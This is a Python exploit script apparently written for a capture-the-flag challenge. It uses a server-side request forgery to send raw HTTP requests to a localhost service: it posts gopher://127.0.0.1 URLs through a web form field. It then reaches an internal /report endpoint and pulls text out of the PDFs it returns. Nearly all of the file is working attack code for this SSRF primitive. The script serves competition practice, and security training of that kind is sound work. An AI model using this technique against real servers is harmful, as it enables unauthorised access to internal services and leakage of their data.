#!/usr/bin/env python3
"""Send a raw HTTP request to a localhost port through the gopher:// SSRF."""
import sys, re, html, urllib.parse, requests

U = 'https://odyssey.web.2026.sunshinectf.games/'

def via_gopher(port, raw, timeout=40):
    # Layers: requests form-encodes (1) -> Flask decodes (2) -> libcurl
    # percent-decodes the gopher selector (3). So the string the APP must hold is
    # percent-encoded once; requests' encoding covers the outer layer for us.
    sel = urllib.parse.quote(raw, safe='')
    feed = f'gopher://127.0.0.1:{port}/_{sel}'
    r = requests.post(U, data={'feed': feed}, timeout=timeout)
    m = re.search(r'<pre class="tape">(.*?)</pre>', r.text, re.S)
    f = re.search(r'class="fault">(.*?)</p>', r.text, re.S)
    d = re.search(r'feed-debug: .*?bytes=(\d+)', r.text, re.S)
    return (html.unescape(m.group(1)) if m else ''),\
           (html.unescape(re.sub(r'\s+',' ',f.group(1))).strip() if f else ''),\
           (int(d.group(1)) if d else -1)

def http_req(method, path, body=b'', host='127.0.0.1:8000', extra=''):
    head = f'{method} {path} HTTP/1.1\r\nHost: {host}\r\n'
    if body:
        head += ('Content-Type: application/x-www-form-urlencoded\r\n'
                 f'Content-Length: {len(body)}\r\n')
    head += extra + 'Connection: close\r\n\r\n'
    return head.encode() + body


def report(content, title=None):
    body = 'content=' + urllib.parse.quote(content, safe='')
    if title: body += '&title=' + urllib.parse.quote(title, safe='')
    return via_gopher(8000, http_req('POST', '/report', body.encode()).decode('latin1'))

if __name__ == '__main__':
    print('=== 1. prove the primitive: GET /feed over gopher ===')
    tape, fault, n = via_gopher(8000, http_req('GET', '/feed').decode('latin1'))
    print(f'bytes={n} fault={fault!r}')
    print(tape[:700])

def pdf_text(content, out='out.pdf'):
    """Render content, pull the base64 PDF out of the JSON, extract its text."""
    import base64, json, subprocess, re as _re
    tape, fault, n = report(content)
    body = tape.split('\r\n\r\n', 1)[-1]
    m = _re.search(r'"data":\s*"([A-Za-z0-9+/=]+)"', body)
    if not m:
        return None, f'no data field (bytes={n}): {body[:200]}'
    raw = base64.b64decode(m.group(1))
    open(out, 'wb').write(raw)
    txt = subprocess.run(['pdftotext', out, '-'], capture_output=True, text=True).stdout
    return txt, f'pdf {len(raw)}B, tape {n}B'
